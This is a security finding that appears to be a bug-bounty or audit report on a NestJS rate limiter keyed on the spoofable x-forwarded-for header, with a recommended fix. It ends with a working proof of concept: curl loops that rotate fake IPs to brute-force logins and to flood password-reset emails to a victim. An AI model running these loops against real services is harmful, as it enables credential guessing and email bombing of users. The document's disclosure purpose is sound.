### Title
Rate Limiter Bypass via Attacker-Controlled `x-forwarded-for` Header Enables Brute-Force and Email Bombing

### Summary
The global `IpThrottlerGuard` — applied to every API endpoint — derives the throttle key from the attacker-controlled `x-forwarded-for` request header without any validation or sanitization. An unauthenticated attacker can rotate arbitrary fake IP values in that header to make every request appear to originate from a different IP, completely nullifying the rate limiter. This allows unlimited login attempts (credential stuffing) and unlimited password-reset OTP emails sent to any registered user.

### Finding Description

**Root cause — `IpThrottlerGuard.getTracker()`** [1](#0-0) 

```typescript
protected getTracker(req: Record<string, any>): Promise<string> {
  const clientIp = req.headers['x-forwarded-for'] || req.ip;
  ...
  return clientIp;   // raw string, not Promise — but JS awaits it fine
}
```

`req.headers['x-forwarded-for']` is a plain HTTP header. Any HTTP client can set it to any arbitrary string. Because it is checked **before** `req.ip`, an attacker who supplies the header always wins — the real socket IP is never consulted.

**Global application — every route is affected** [2](#0-1) 

`IpThrottlerGuard` is registered as `APP_GUARD`, meaning it is the first throttle check on every single endpoint in the API service.

**Throttler configuration — limits that are bypassed** [3](#0-2) 

The configured limits (`GLOBAL_MINUTE_LIMIT`, `GLOBAL_SECOND_LIMIT`) are stored per-key in Redis. Because the attacker controls the key, those counters are never incremented for the same attacker across requests.

**High-value endpoints exposed** [4](#0-3) 

`POST /auth/login` — protected only by `LocalAuthGuard` + `EmailThrottlerGuard` after the global guard. If the global guard is bypassed, the `EmailThrottlerGuard` (which also uses IP-based tracking via the same module pattern) is the only remaining barrier, and it is subject to the same bypass. [5](#0-4) 

`POST /auth/reset-password` — unauthenticated endpoint that triggers an OTP email to any registered address. No authentication is required before the email is sent.

**Exploit flow**

1. Attacker sends `POST /auth/login` with `x-forwarded-for: 1.2.3.1`, then `1.2.3.2`, `1.2.3.3`, … — each request is a fresh counter in Redis; the limit is never reached.
2. Same technique on `POST /auth/reset-password` with a victim's email — unlimited OTP emails are dispatched to the victim.

### Impact Explanation

- **Credential stuffing / brute-force**: The rate limiter is the only server-side defense against password guessing on `/auth/login`. With it bypassed, an attacker can try millions of passwords with no throttling.
- **Email bombing**: `POST /auth/reset-password` is unauthenticated and triggers a real email per call. An attacker can flood any registered user's inbox indefinitely, causing account disruption and potential email-provider blacklisting of the server's sending domain.
- Both impacts are concrete and measurable, not theoretical.

### Likelihood Explanation

- **Attacker preconditions**: None. No account, no token, no privileged access required.
- **Technique**: Setting an HTTP header is trivial with any HTTP client (`curl`, Python `requests`, etc.).
- **Detection difficulty**: Rotating fake IPs in `x-forwarded-for` produces no repeated-IP signal in logs, making automated detection harder.
- **Realistic**: This is a well-known class of rate-limiter bypass; any attacker familiar with web security will attempt it.

### Recommendation

1. **Do not trust `x-forwarded-for` directly.** Use NestJS's built-in `req.ip` (which Express resolves from the actual socket or a trusted proxy chain configured via `app.set('trust proxy', N)`).
2. **Configure Express trust-proxy correctly** for the deployment topology (Kubernetes ingress / load balancer). Set `app.set('trust proxy', 1)` (or the appropriate hop count) so that `req.ip` reflects the real client IP after the trusted proxy strips/rewrites the header.
3. **Remove the `x-forwarded-for` fallback** from `getTracker()`:

```typescript
protected getTracker(req: Record<string, any>): Promise<string> {
  const clientIp = req.ip;   // trust Express, not the raw header
  if (!clientIp) {
    throw new HttpException('Unable to determine client IP', HttpStatus.INTERNAL_SERVER_ERROR);
  }
  return Promise.resolve(clientIp);
}
```

4. For the `EmailThrottlerGuard`, apply the same fix and consider adding a secondary per-email-address counter for `/auth/reset-password` so that even a legitimate IP cannot spam a single victim's address.

### Proof of Concept

```bash
# Bypass rate limiter on login by rotating x-forwarded-for
for i in $(seq 1 10000); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://api.example.com/auth/login \
    -H "Content-Type: application/json" \
    -H "x-forwarded-for: 10.0.0.$((i % 254 + 1))" \
    -H "x-frontend-version: 2.0.0" \
    -d '{"email":"victim@example.com","password":"guess'$i'"}'
done
# Expected: all requests return 401 (wrong password), never 429 (rate limited)
# Without the bypass, requests would be throttled after GLOBAL_MINUTE_LIMIT hits

# Email bombing via reset-password
for i in $(seq 1 500); do
  curl -s -o /dev/null \
    -X POST https://api.example.com/auth/reset-password \
    -H "Content-Type: application/json" \
    -H "x-forwarded-for: 192.168.1.$((i % 254 + 1))" \
    -H "x-frontend-version: 2.0.0" \
    -d '{"email":"victim@example.com"}'
done
# Expected: 500 OTP emails delivered to victim with no throttle response
```

Each iteration uses a distinct fake IP value, so the Redis counter for each key never exceeds 1, and the configured `GLOBAL_MINUTE_LIMIT` / `ANONYMOUS_MINUTE_LIMIT` limits are never triggered.
